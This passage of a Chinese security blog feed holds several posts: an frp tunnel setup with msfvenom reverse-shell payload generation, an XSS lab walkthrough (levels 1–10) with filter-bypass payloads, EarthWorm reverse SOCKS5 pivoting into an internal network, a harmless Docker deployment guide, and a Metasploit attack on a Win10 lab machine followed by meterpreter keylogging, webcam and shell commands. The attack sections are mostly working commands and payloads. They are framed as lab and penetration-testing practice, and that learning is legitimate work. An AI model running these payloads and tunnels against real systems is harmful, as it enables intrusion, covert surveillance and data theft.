<p><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20210129172017.png" alt="20210129172017"></p>
</li>
<li><p>ps：开启后，还需要在阿里云的控制台的防火墙页面添加相应端口，例如本例中需添加10080，7500，7000</p>
</li>
</ul>
<hr>
<ul>
<li><p>客户端配置</p>
<p>删除无用服务端文件:<code>rm frps frps.ini frps_full.ini</code></p>
<p>然后修改frpc.ini:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr &#x3D; 公网ip</span><br><span class="line">server_port &#x3D; 7000</span><br><span class="line"></span><br><span class="line">[web]</span><br><span class="line">type &#x3D; http</span><br><span class="line">local_port &#x3D; 5000</span><br><span class="line">custom_domains &#x3D; 公网ip</span><br><span class="line"></span><br><span class="line">[ssh]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">local_ip &#x3D; 127.0.0.1</span><br><span class="line">local_port &#x3D; 22</span><br><span class="line">remote_port &#x3D;2222</span><br><span class="line"></span><br><span class="line">[msf]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">local_ip &#x3D; 127.0.0.1</span><br><span class="line">local_port &#x3D; 4444</span><br><span class="line">remote_port &#x3D; 10081</span><br><span class="line">custom_domains &#x3D; 公网ip</span><br><span class="line"></span><br><span class="line">说明：</span><br><span class="line">[web]:通过公网ip+10080可以访问开在客户端5000端口的web服务</span><br><span class="line">[ssh]:通过公网ip+2222端口可以连接客户端(客户端ssh端口为22)</span><br><span class="line">[msf]:肉鸡访问公网ip+10081可以反弹shell(攻击者在本地监听4444端口)</span><br></pre></td></tr></table></figure>

<p>保存后，在文件所在目录启动运行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;frpc -c .&#x2F;frpc.ini    #前台运行</span><br><span class="line">nohup .&#x2F;frpc -c .&#x2F;frpc.ini &amp;    #后台运行</span><br></pre></td></tr></table></figure>
<p>终端显示如下信息表示成功启动：</p>
<p><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20210129174208.png" alt="20210129174208"></p>
</li>
<li><p>ps：开启后，还需要在阿里云的控制台的防火墙页面添加相应端口，例如本例中需添加10080，10081，2222，其他配置可以参考官方文档：<a href="https://gofrp.org/docs/">https://gofrp.org/docs/</a></p>
</li>
</ul>
<hr>
<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>搭建完成后，任意主机可通过访问公网ip+7500端口访问dashboard页面，可看到tcp页面已有两条信息：</p>
<p><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20210129174741.png" alt="20210129174741"></p>
<ul>
<li><p>Web测试：</p>
<p>在客户端(kali)的5000端口开启一个flask服务：</p>
<p><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20210129175533.png" alt="20210129175533"></p>
<p>任意一台主机可通过公网ip+10080端口访问客户端(kali)的web服务，使用测试端主机测试：</p>
<p><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20210129185259.png" alt="20210129185259"></p>
<p>测试成功！</p>
</li>
<li><p>ssh测试：</p>
<p>测试端(windows)使用Xshell配置ssh，主机填写公网ip，端口填写frpc.ini中配置的2222端口：</p>
<p><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20210129183450.png" alt="20210129183450"></p>
<p>然后在测试端输入客户端(kali)的用户名和密码，成功登录客户端(kali)主机：</p>
<p><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20210129182818.png" alt="20210129182818"></p>
</li>
<li><p>msf测试</p>
<p>在客户端(kali)先利用msf生成一个windows马：<code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=公网ip LPORT=10081 -f exe -o frptest.exe</code></p>
<p>接着客户端(kali)配置msf模块，监听本地4444端口：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set lhost 127.0.0.1</span><br><span class="line">set lport 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
<p>然后将生成的windows马拷贝到测试端(windows)上，运行该木马后，在客户端(kali)上会反弹shell，测试成功：</p>
<p><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20210129191246.png" alt="20210129191246"></p>
<p>ps: 附几个生成马的payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;公网ip LPORT&#x3D;10081 -f exe -o frptest.exe</span><br><span class="line">msfvenom -p linux&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;公网ip lport&#x3D;10081 -f elf -o frptest.elf</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>xss(1~10)</title>
    <url>/2019/03/08/xss(1~10)/</url>
    <content><![CDATA[<p><a href="http://test.xss.tv/" title="xss闯关入口">xss闯关入口</a></p>
<a id="more"></a>
<h2 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h2><p>查看源代码，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$str &#x3D; $_GET[&quot;name&quot;];</span><br><span class="line">echo &quot;&lt;h2 align&#x3D;center&gt;欢迎用户&quot;.$str.&quot;&lt;&#x2F;h2&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>并没有过滤，<br>payload:<code>name=&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
<h2 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h2><p>查看源代码，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$str &#x3D; $_GET[&quot;keyword&quot;];</span><br><span class="line">echo &quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;.&#39;&lt;center&gt;</span><br><span class="line">&lt;form action&#x3D;level2.php method&#x3D;GET&gt;</span><br><span class="line">&lt;input name&#x3D;keyword  value&#x3D;&quot;&#39;.$str.&#39;&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;&quot;搜索&quot;&#x2F;&gt;</span><br></pre></td></tr></table></figure>
<p>有两处输出，第一处在echo处，但被做了转义处理，起到过滤效果，第二处在input处，没有过滤，所以选择在表单的input里攻击,注意语句闭合方式为 “ ，<br>payload:<code>&quot; onclick=&quot;alert(1)</code></p>
<h2 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h2><p>查看源代码，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$str &#x3D; $_GET[&quot;keyword&quot;];</span><br><span class="line">echo &quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;.&quot;&lt;center&gt;</span><br><span class="line">&lt;form action&#x3D;level3.php method&#x3D;GET&gt;</span><br><span class="line">&lt;input name&#x3D;keyword  value&#x3D;&#39;&quot;.htmlspecialchars($str).&quot;&#39;&gt;</span><br><span class="line">&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;搜索 &#x2F;&gt;</span><br></pre></td></tr></table></figure>
<p>两处输出位置都做了转义处理，都被过滤了，所以 “，&lt;，&gt;符号（双引号和尖括号）就没有效果了，但是源码里input里的value的闭合方式为 ‘，所以还是可以攻击的。<br>payload:<code>&#39; onclick=&#39;alert(1)</code></p>
<h2 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h2><p>查看源代码，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$str &#x3D; $_GET[&quot;keyword&quot;];</span><br><span class="line">$str2&#x3D;str_replace(&quot;&gt;&quot;,&quot;&quot;,$str);</span><br><span class="line">$str3&#x3D;str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);</span><br><span class="line">echo &quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;.&#39;&lt;center&gt;</span><br><span class="line">&lt;form action&#x3D;level4.php method&#x3D;GET&gt;</span><br><span class="line">&lt;input name&#x3D;keyword  value&#x3D;&quot;&#39;.$str3.&#39;&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;搜索 &#x2F;&gt;</span><br></pre></td></tr></table></figure>
<p>两处输出位置，一处被转义了，input处没被转义，但是被做了函数处理，尖括号被替换为了空，和less-3的套路一样。<br>payload:<code>&quot; onclick=&quot;alert(1)</code></p>
<h2 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h2><p>查看源代码，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$str &#x3D; strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2&#x3D;str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);</span><br><span class="line">$str3&#x3D;str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line">echo &quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;.&#39;&lt;center&gt;</span><br><span class="line">&lt;form action&#x3D;level5.php method&#x3D;GET&gt;</span><br><span class="line">&lt;input name&#x3D;keyword  value&#x3D;&quot;&#39;.$str3.&#39;&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;搜索 &#x2F;&gt;</span><br></pre></td></tr></table></figure>
<p>有两处输出，一处被做了转义处理，input处输入被做了小写和on，&lt;script被做了替换处理，<br>payload:<code>&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;xss&lt;/a&gt;</code></p>
<h2 id="less-6"><a href="#less-6" class="headerlink" title="less-6"></a>less-6</h2><p>查看源代码，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$str &#x3D; $_GET[&quot;keyword&quot;];</span><br><span class="line">$str2&#x3D;str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);</span><br><span class="line">$str3&#x3D;str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line">$str4&#x3D;str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span><br><span class="line">$str5&#x3D;str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span><br><span class="line">$str6&#x3D;str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span><br><span class="line">echo &quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;.&#39;&lt;center&gt;</span><br><span class="line">&lt;form action&#x3D;level6.php method&#x3D;GET&gt;</span><br><span class="line">&lt;input name&#x3D;keyword  value&#x3D;&quot;&#39;.$str6.&#39;&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>有两处输出，一处被做了转义处理，input处&lt;script,on,src,data,href被做了替换处理，但是没有做less-5中的小写处理，所以可以通过大写替换字绕过，<br>payload:<code>&quot; ONclick=&quot;alert(1)</code></p>
<h2 id="less-7"><a href="#less-7" class="headerlink" title="less-7"></a>less-7</h2><p>查看源代码，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$str &#x3D;strtolower( $_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2&#x3D;str_replace(&quot;script&quot;,&quot;&quot;,$str);</span><br><span class="line">$str3&#x3D;str_replace(&quot;on&quot;,&quot;&quot;,$str2);</span><br><span class="line">$str4&#x3D;str_replace(&quot;src&quot;,&quot;&quot;,$str3);</span><br><span class="line">$str5&#x3D;str_replace(&quot;data&quot;,&quot;&quot;,$str4);</span><br><span class="line">$str6&#x3D;str_replace(&quot;href&quot;,&quot;&quot;,$str5);</span><br><span class="line">echo &quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;.&#39;&lt;center&gt;</span><br><span class="line">&lt;form action&#x3D;level7.php method&#x3D;GET&gt;</span><br><span class="line">&lt;input name&#x3D;keyword  value&#x3D;&quot;&#39;.$str6.&#39;&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>有两处输出，一处被做了转义处理，input处做了小写处理和script,on,src,data,href被做了替换处理，可以利用双写来拼合成，例如oonn被处理后就变为了on，<br>payload:<code>&quot; oonnclick=&quot;alert(1)</code></p>
<h2 id="less-8"><a href="#less-8" class="headerlink" title="less-8"></a>less-8</h2><p>查看源代码，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$str &#x3D; strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2&#x3D;str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);</span><br><span class="line">$str3&#x3D;str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line">$str4&#x3D;str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span><br><span class="line">$str5&#x3D;str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span><br><span class="line">$str6&#x3D;str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span><br><span class="line">$str7&#x3D;str_replace(&#39;&quot;&#39;,&#39;&amp;quot&#39;,$str6);</span><br><span class="line">……</span><br><span class="line">&lt;input name&#x3D;keyword  value&#x3D;&quot;&#39;.htmlspecialchars($str).&#39;&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;添加友情链接 &#x2F;&gt;</span><br><span class="line"> echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href&#x3D;&quot;&#39;.$str7.&#39;&quot;&gt;友情链接&lt;&#x2F;a&gt;&lt;&#x2F;center&gt;&#39;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>有两处输出，一处input做了转义处理，另一处做了小写处理和script,on,src,data,href，” ，被做了替换处理，这题的关键在友情链接处,点击”添加友情链接”后会在友情链接出加入一个拼接的语句。<br>t的ASCII码116用表示为”&amp;#116”，同理:表示为”&amp;#58”，<br>payload:<code>javascrip&amp;#116:alert(1)</code></p>
<h2 id="less-9"><a href="#less-9" class="headerlink" title="less-9"></a>less-9</h2><p>查看源代码，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$str &#x3D; strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2&#x3D;str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);</span><br><span class="line">$str3&#x3D;str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line">$str4&#x3D;str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span><br><span class="line">$str5&#x3D;str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span><br><span class="line">$str6&#x3D;str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span><br><span class="line">$str7&#x3D;str_replace(&#39;&quot;&#39;,&#39;&amp;quot&#39;,$str6);</span><br><span class="line">……</span><br><span class="line">&lt;form action&#x3D;level9.php method&#x3D;GET&gt;</span><br><span class="line">&lt;input name&#x3D;keyword  value&#x3D;&quot;&#39;.htmlspecialchars($str).&#39;&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;添加友情链接 &#x2F;&gt;</span><br><span class="line">……</span><br><span class="line">if(false&#x3D;&#x3D;&#x3D;strpos($str7,&#39;http:&#x2F;&#x2F;&#39;))</span><br><span class="line">&#123;</span><br><span class="line">  echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href&#x3D;&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;&#x2F;a&gt;&lt;&#x2F;center&gt;&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">  echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href&#x3D;&quot;&#39;.$str7.&#39;&quot;&gt;友情链接&lt;&#x2F;a&gt;&lt;&#x2F;center&gt;&#39;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>有两处输出，一处input做了转义处理，另一处做了小写处理和script,on,src,data,href，” ，被做了替换处理，而且出现了strpos()函数，表示查找 “http://“ 在字符串中第一次出现的位置。只要!=false，就会跳向可攻击的语句，所以构造的语句中要含有http://，利用javascript中的注释符//，<br>payload:<code>javascrip&amp;#116:alert(1)//http://</code></p>
<h2 id="less-10"><a href="#less-10" class="headerlink" title="less-10"></a>less-10</h2><p>查看源代码，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$str &#x3D; $_GET[&quot;keyword&quot;];</span><br><span class="line">$str11 &#x3D; $_GET[&quot;t_sort&quot;];</span><br><span class="line">$str22&#x3D;str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class="line">$str33&#x3D;str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br><span class="line">echo &quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;.&#39;&lt;center&gt;</span><br><span class="line">&lt;form id&#x3D;search&gt;</span><br><span class="line">&lt;input name&#x3D;&quot;t_link&quot;  value&#x3D;&quot;&#39;.&#39;&quot; type&#x3D;&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name&#x3D;&quot;t_history&quot;  value&#x3D;&quot;&#39;.&#39;&quot; type&#x3D;&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name&#x3D;&quot;t_sort&quot;  value&#x3D;&quot;&#39;.$str33.&#39;&quot; type&#x3D;&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>有两处输出，一处被做了转义，一处input被作为隐藏表单(type=”hidden”)处理页面没有显示，需要先将隐藏表单触发显示出来，然后在input处攻击，看到url处可以get参数t_sort，所以可以构造payload了。<br>payload:<code>url后加 &amp;t_sort=xss&quot; onclick=alert(1) type=&quot;text&quot;</code></p>
<p><strong><em>xss(1~10)关卡全部完成了，如有错误，欢迎在评论中指出!</em></strong></p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>配置反向socks5代理实现内网渗透</title>
    <url>/2021/01/28/%E5%86%85%E7%BD%91%E5%8F%8D%E5%90%91socks%E4%BB%A3%E7%90%86/</url>
    <content><![CDATA[<p>EarthWorm是一款用于开启 SOCKS v5 代理服务的工具，基于标准 C 开发，可提供多平台间的转接通讯，用于复杂网络环境下的数据转发。 </p>
<p>EW主页： <a href="http://rootkiter.com/EarthWorm/">http://rootkiter.com/EarthWorm/</a></p>
<p>EW项目地址：<a href="https://github.com/idlefire/ew">https://github.com/idlefire/ew</a></p>
<a id="more"></a>
<hr>
<h2 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h2><ul>
<li>云服务器B</li>
<li>主机A处于内网</li>
<li>主机C处于不同于A的内网</li>
<li>效果：主机A作为主机C的代理，使得主机C能够访问主机A内网内的Web资源</li>
</ul>
<p>主机A网络不存在公网ip，需要通过反弹到云服务器B的方式创建socks5代理，当另一内网内的主机C挂了云服务器B的正向代理时，即可访问A内网内的Web资源，如下图所示：</p>
<p><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20210128214524.png" alt="20210128214524"></p>
<p>上图中，当C挂了B的正向代理时，访问baidu.com时流程如下：</p>
<ul>
<li>1.C把请求发送给代理B；</li>
<li>2.代理B把请求发送给搭建反向socks5的A；</li>
<li>3.A去请求baidu.com页面；</li>
<li>4.A将baidu.com的返回页面回复给B；</li>
<li>5.B将A的回复信息回复给C，至此，A作为C的代理成功访问；</li>
</ul>
<hr>
<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>首先通过上述链接下载EW项目，其中包含多个系统的版本，根据需要选择，搭建步骤如下：</p>
<ul>
<li><p>在阿里云控制台的防火墙页面添加1080和1024两个端口，下面会用到：</p>
<p><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20210128215352.png" alt="20210128215352"></p>
</li>
<li><p>在云服务器B(linux)上分别执行以下命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod a+x ew_for_linux64     #允许文件以可执行程序运行</span><br><span class="line">.&#x2F;ew_for_linux64 -s rcsocks -l 1080 -e 1024</span><br></pre></td></tr></table></figure>

<p>监听vps本机的1080端口并转发到反连1024端口的主机</p>
</li>
<li><p>在主机A(Windows)上，执行以下命令：</p>
<p><code>.\ew_for_Win.exe -s rssocks -d x.x.x.x -e 1024</code></p>
<p>通过socks隧道连接公网IP的1024端口，其中x.x.x.x为云服务器ip</p>
</li>
<li><p>服务器和客户端启动正常时，会提示成功：</p>
<p><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20210128213040.png" alt="20210128213040"></p>
</li>
</ul>
<hr>
<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><ul>
<li><p>在主机A(内网ip为192.168.101.32)上，开一个flask服务，web端口为5000；</p>
<p><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20210128220521.png" alt="20210128220521"></p>
</li>
<li><p>在主机C上，浏览器利用代理插件配置socks5代理，IP为云服务器的ip(x.x.x.x)，端口为1080:</p>
<p><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20210128215805.png" alt="20210128215805"></p>
</li>
<li><p>主机C挂上上一步配置的socks5代理后，访问A的flask服务，成功访问内网web资源：</p>
<p><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20210128221906.png" alt="20210128221906"></p>
</li>
</ul>
<p><strong><em>若有错误，请在评论区指出，感谢！！！</em></strong></p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>利用docker将web项目部署到服务器</title>
    <url>/2019/03/31/%E5%88%A9%E7%94%A8docker%E5%B0%86web%E9%A1%B9%E7%9B%AE%E9%83%A8%E7%BD%B2%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
    <content><![CDATA[<p><strong>完成了一个简单的web项目，想部署到云服务器，利用docker是一个很好的办法</strong></p>
<h2 id="创建docker容器"><a href="#创建docker容器" class="headerlink" title="创建docker容器"></a>创建docker容器</h2><p>在当前web项目目录下创建Dockerfile和requirements.txt两个文件。文件填写内容根据你的web项目来定，具体参考官网教程。<a href="https://docs.docker.com/get-started/part2/#define-a-container-with-dockerfile">～～docker官网～～</a></p>
<a id="more"></a>
<p><img src="https://s2.ax1x.com/2019/03/30/ABTpIs.png" alt="我的目录结构"></p>
<p>接下来创建docker镜像，打开终端，输入<br><code>docker image build -t name .</code><br>name为你创建的镜像名字，自定义，注意不要漏了name后的那个“.”<br>然后输入<code>docker image ls</code><br><img src="https://s2.ax1x.com/2019/03/30/ABTdJI.png" alt="在这里插入图片描述"><br>显示已存在的docker镜像，cumt是我的web项目，下面我要将cumt这个镜像部署到我的阿里云服务器。</p>
<h2 id="生成静态文件"><a href="#生成静态文件" class="headerlink" title="生成静态文件"></a>生成静态文件</h2><p>将docker镜像导出为静态文件<br><code> docker save cumt:latest &gt; cumt.tar</code></p>
<p>cumt:latest为镜像名, cumt.tar为新生成的静态文件名。</p>
<h2 id="部署到云服务器"><a href="#部署到云服务器" class="headerlink" title="部署到云服务器"></a>部署到云服务器</h2><p>使用scp将静态文件上传到服务器端<br><code>scp ./cumt.tar root@47.106.130.6:/cumt.tar</code></p>
<p>使用ssh登陆你的云服务器<br><code>ssh root@47.106.130.6</code></p>
<p>输入ls查看是否上传成功<br><code>ls</code></p>
<p>如果ls下没有找到你上传的静态文件，使用find命令查找它。<br><code>find / -name cumt.tar</code></p>
<h2 id="还原静态文件"><a href="#还原静态文件" class="headerlink" title="还原静态文件"></a>还原静态文件</h2><p>在静态文件所在位置目录下运行docker load命令还原。<br><code>docker load &lt; cumt.tar</code><br>输入<code>docker image ls</code>发现，已还原为镜像文件。<br><img src="https://s2.ax1x.com/2019/03/30/AB7mX8.png" alt="cumt镜像已还原"></p>
<p>大功告成，可以直接运行了，如果不需要连接数据库的话直接输入<br><code>docker run -p 4000:5000 cumt</code><br>如果需要连接数据库，则需要用link方法挂载数据库（前提是你已经有数据库镜像）<br><code>docker run --link your-mysql -p 4000:5000 cumt</code><br>访问服务器公网的4000端口就可以访问你的web项目了。注意要在控制台打开服务器的4000端口（映射端口号可以自定义）</p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结:"></a>小结:</h2><p><strong>利用静态文件进行容器的迁移, 是一件非常简单的事情, 你可以像发布一个软件包一样将自己的docker容器生成的静态文件分发到各类操作系统, docker才是真正的跨平台呀!</strong></p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>利用msf攻击win10</title>
    <url>/2019/03/30/%E5%88%A9%E7%94%A8msf%E6%94%BB%E5%87%BBwin10/</url>
    <content><![CDATA[<hr>
<p>攻击环境：<br>攻击者系统：虚拟机下kali linux<br>靶机系统：win10（需要打开Easy File Sharing服务）<br>攻击者ip：10.3.134.27<br>靶机ip：10.3.37.56<br>攻击者和靶机在同一个wifi下，保证在同一网段里，能互相ping通。<br>漏洞利用：EsayFileSharing</p>
<h6 id="注意点：-攻击者的虚拟机网络模式应选择桥接模式。"><a href="#注意点：-攻击者的虚拟机网络模式应选择桥接模式。" class="headerlink" title="注意点： 攻击者的虚拟机网络模式应选择桥接模式。"></a><strong>注意点：</strong> 攻击者的虚拟机网络模式应选择桥接模式。</h6><a id="more"></a>
<hr>
<p><strong>准备工作完成，可以开始内网渗透之旅了。</strong></p>
<h2 id="step-1"><a href="#step-1" class="headerlink" title="step-1"></a>step-1</h2><p>首先我们先用nmap扫描一下靶机开了哪些服务<br><code>root@kali:~# nmap -sV 10.3.37.56</code><br><img src="https://s2.ax1x.com/2019/03/30/AByzVK.png" alt="namp扫描结果">我们可以看到80端口和443端口开放了，对应的是Easy File Sharing Web Server，满足EasyFileSharing漏洞攻击，进入下一步。</p>
<h2 id="step-2"><a href="#step-2" class="headerlink" title="step-2"></a>step-2</h2><p>打开msf控制台，设置攻击参数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# msfconsole              #进入控制台，稍微等一下</span><br><span class="line">msf &gt; search EasyFileSharing         #查找我们要用的漏洞</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.ax1x.com/2019/03/30/AB63Mn.png" alt="搜索结果"><br>我们选择最新的一个，2017-06-12的版本，并设置payload。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf &gt; use exploit&#x2F;windows&#x2F;http&#x2F;easyfilesharing_post    #使用这个漏洞</span><br><span class="line">msf exploit(windows&#x2F;http&#x2F;easyfilesharing_post) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcp   #设置攻击payload</span><br></pre></td></tr></table></figure>
<p>我们用show options看一下需要什么攻击参数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf exploit(windows&#x2F;http&#x2F;easyfilesharing_post) &gt; show options</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.ax1x.com/2019/03/30/AB6bo8.png" alt="设置参数"><br>根据Required属性看一下哪些是需要配置的，其中一些是配置好的，我们只需将其他的配置好就ok了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf exploit(windows&#x2F;http&#x2F;easyfilesharing_post) &gt; set lhost 10.3.134.27   #设置本地ip</span><br><span class="line">msf exploit(windows&#x2F;http&#x2F;easyfilesharing_post) &gt; set rhost 10.3.37.56    #设置远程ip</span><br></pre></td></tr></table></figure>
<p>参数都配置好了，接着就是激动人心的exploit了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf exploit(windows&#x2F;http&#x2F;easyfilesharing_post) &gt; exploit   #攻击</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.ax1x.com/2019/03/30/ABcCwV.png" alt="显示这个页面，说明你成功了"><br>逐个输入以下命令，试试</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; getuid          #获取靶机uid</span><br><span class="line">meterpreter &gt; shell           #进入靶机shell</span><br><span class="line">meterpreter &gt; screenshot      #靶机截屏</span><br><span class="line">meterpreter &gt; webcam_snap     #用靶机摄像头拍照</span><br><span class="line">meterpreter &gt; webcam_stream   #用靶机摄像头录像</span><br><span class="line">meterpreter &gt; keyscan_start   #开启键盘记录</span><br><span class="line">meterpreter &gt; keyscan_dump    #捕获键盘记录</span><br><span class="line">meterpreter &gt; keyscan_stop    #停止键盘记录</span><br></pre></td></tr></table></figure>
